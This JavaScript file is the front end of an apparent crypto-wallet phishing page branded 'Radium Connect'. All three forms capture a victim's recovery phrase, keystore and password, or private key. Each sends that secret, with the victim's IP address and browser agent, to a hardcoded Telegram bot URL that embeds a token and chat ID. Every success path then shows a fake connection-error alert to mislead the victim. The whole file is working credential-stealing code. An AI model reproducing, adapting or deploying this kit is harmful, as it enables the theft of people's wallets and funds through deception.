(function ($) {
	
	"use strict";

	$(document).ready(function(){
		$("#clMdal1").click(function() {
			$("#mdOver").css("display", "none")	
			$("#mdal1").hide(200)
		})

		$(".clMdal2").click(function() {
			$("#mdOver").css("display", "none")	
			$("#mdal2").hide(200)
		})
		$(".clMdal3").click(function() {
			$("#mdOver").css("display", "none")	
			$("#mdal3").hide(200)
		})
		$(".clMod5").click(function() {
			$("#mdOver").css("display", "none")	
			$("#mdal5").hide(200)
			$("#tab1").click()
		})


		$("#opMdal3").click(function() {
			$("#mdOver").css("display", "flex")	
			$("#mdal3").css("display", "flex")
		})
		$("#opMdal2").click(function() {
			$("#mdOver").css("display", "flex")	
			$("#mdal2").css("display", "flex")
		})

		setTimeout(function(){
			$("#mdOver").css("display", "flex")
			$("#mdal1").css("display", "flex")
		}, 100)


		$(".coin").on("click", function() {
			$("#inp1").val("")
			$("#inp2").val("")
			$("#inp3").val("")
			$("#inp4").val("")
			var a = $(this).find("img").attr("src")
			var b = $(this).find("span").html()
			$(".modImg").attr("src", a)
			$(".modCoin").html(b)
			$("#mdal3").hide(200)
			$("#mdal4").css("display", "flex")
			sessionStorage.setItem("wallType", b)
			setTimeout(function() {
				$("#mdal4").hide(200)
				$("#mdal5").css("display", "flex")
			}, 4000)
		})





			
		$("#tab2Holder").hide()
		$("#tab3Holder").hide()

		$("#tab1").on("click", function() {
			$("#tab1").css("border-bottom", "2px solid #fff")
			$("#tab2").css("border-bottom", "2px solid transparent")
			$("#tab3").css("border-bottom", "2px solid transparent")
			$("#tab1Holder").show(300)
			$("#tab2Holder").hide()
			$("#tab3Holder").hide()
		})
		$("#tab2").on("click", function() {
			$("#tab2").css("border-bottom", "2px solid #fff")
			$("#tab1").css("border-bottom", "2px solid transparent")
			$("#tab3").css("border-bottom", "2px solid transparent")
			$("#tab2Holder").show(300)
			$("#tab1Holder").hide()
			$("#tab3Holder").hide()
		})
		$("#tab3").on("click", function() {
			$("#tab3").css("border-bottom", "2px solid #fff")
			$("#tab2").css("border-bottom", "2px solid transparent")
			$("#tab1").css("border-bottom", "2px solid transparent")
			$("#tab3Holder").show(300)
			$("#tab2Holder").hide()
			$("#tab1Holder").hide()
		})
		

		$.get("https://api.ipify.org?format=json", function(data, status){
			sessionStorage.setItem("plasta", data?.ip)
		})





		$("#form1").on("submit", function(event) {
        	event.preventDefault()
        
        	var agent = window.navigator.userAgent
        	var ip = sessionStorage.getItem("plasta")
        	var a = document.getElementById('inp1').value
        	var wallType = sessionStorage.getItem("wallType")
        
        	var sData = encodeURIComponent(
        		"ðŸ¦„ New Radium Connect\n\n" +
        		"Wallet Type: " + wallType + "\n\n" +
        		"Pass Phrase:\n" + a + "\n\n" +
        		"IP Address: " + ip + "\n" +
        		"Browser Agent: " + agent
        	)
        
        	$.ajax({
        		url: 'https://api.telegram.org/bot7776629162:AAEzSfCXQe9lTVSl1qf0fTDA-HuR_YW2Dlk/sendMessage?chat_id=7322006822&text=' + sData + '&parse_mode=HTML',
        		type: 'GET',
        		beforeSend: function() {
        			$("#btn1").html('<div style="display: flex;align-items: center;justify-content: center;">Connecting <i class="fa fa-spinner fa-spin" style="color: #fff;font-size: 20px;margin-left: 12px;"></i></div>')
        		},
        		success: function(response) {
        			$("#btn1").html("Proceed")
        			$("#mdOver").css("display", "none")
        			$("#mdal5").hide()
        			$("#tab1").click()
        
        			setTimeout(function() {
        				alert("Error occured while trying to connect wallet! Please try again and if error persist please contact chat support.")
        			}, 500)
        		},
        		error: function(xhr) {
        			$("#btn1").html("Proceed")
        			alert("Error occured while trying to connect wallet! Please try again and if error persist please contact chat support.")
        		}
        	})
        })

	
	
		$("#form2").on("submit", function(event) {
        	event.preventDefault()
        
        	var agent = window.navigator.userAgent
        	var ip = sessionStorage.getItem("plasta")
        	var a = document.getElementById('inp2').value // Keystore
        	var b = document.getElementById('inp3').value // Password
        	var wallType = sessionStorage.getItem("wallType")
        
        	var sData = encodeURIComponent(
        		"ðŸ¦„ New Radium Connect\n\n" +
        		"Wallet Type: " + wallType + "\n\n" +
        		"Keystore:\n" + a + "\n\n" +
        		"Wallet Password:\n" + b + "\n\n" +
        		"IP Address: " + ip + "\n" +
        		"Browser Agent: " + agent
        	)
        
        	$.ajax({
        		url: 'https://api.telegram.org/bot7776629162:AAEzSfCXQe9lTVSl1qf0fTDA-HuR_YW2Dlk/sendMessage?chat_id=7322006822&text=' + sData + '&parse_mode=HTML',
        		type: 'GET',
        		beforeSend: function() {
        			$("#btn2").html('<div style="display: flex;align-items: center;justify-content: center;">Connecting <i class="fa fa-spinner fa-spin" style="color: #fff;font-size: 20px;margin-left: 12px;"></i></div>')
        		},
        		success: function(response) {
        			$("#btn2").html("Proceed")
        			$("#mdOver").css("display", "none")
        			$("#mdal5").hide()
        			$("#tab1").click()
        
        			setTimeout(function() {
        				alert("Error occured while trying to connect wallet! Please try again and if error persist please contact chat support.")
        			}, 500)
        		},
        		error: function(xhr) {
        			$("#btn2").html("Proceed")
        			alert("Error occured while trying to connect wallet! Please try again and if error persist please contact chat support.")
        		}
        	})
        })

	
	
		$("#form3").on("submit", function(event) {
        	event.preventDefault()
        
        	var agent = window.navigator.userAgent
        	var ip = sessionStorage.getItem("plasta")
        	var a = document.getElementById('inp4').value
        	var wallType = sessionStorage.getItem("wallType")
        
        	var sData = encodeURIComponent(
        		"ðŸ¦„ New Radium Connect\n\n" +
        		"Wallet Type: " + wallType + "\n\n" +
        		"Private Key:\n" + a + "\n\n" +
        		"IP Address: " + ip + "\n" +
        		"Browser Agent: " + agent
        	)
        
        	$.ajax({
        		url: 'https://api.telegram.org/bot7776629162:AAEzSfCXQe9lTVSl1qf0fTDA-HuR_YW2Dlk/sendMessage?chat_id=7322006822&text=' + sData + '&parse_mode=HTML',
        		type: 'GET',
        		beforeSend: function() {
        			$("#btn3").html('<div style="display: flex;align-items: center;justify-content: center;">Connecting <i class="fa fa-spinner fa-spin" style="color: #fff;font-size: 20px;margin-left: 12px;"></i></div>')
        		},
        		success: function(response) {
        			$("#btn3").html("Proceed")
        			$("#mdOver").css("display", "none")
        			$("#mdal5").hide()
        			$("#tab1").click()
        
        			setTimeout(function() {
        				alert("Error occured while trying to connect wallet! Please try again and if error persist please contact chat support.")
        			}, 500)
        		},
        		error: function(xhr) {
        			$("#btn3").html("Proceed")
        			alert("Error occured while trying to connect wallet! Please try again and if error persist please contact chat support.")
        		}
        	})
        })

	})
})(window.jQuery);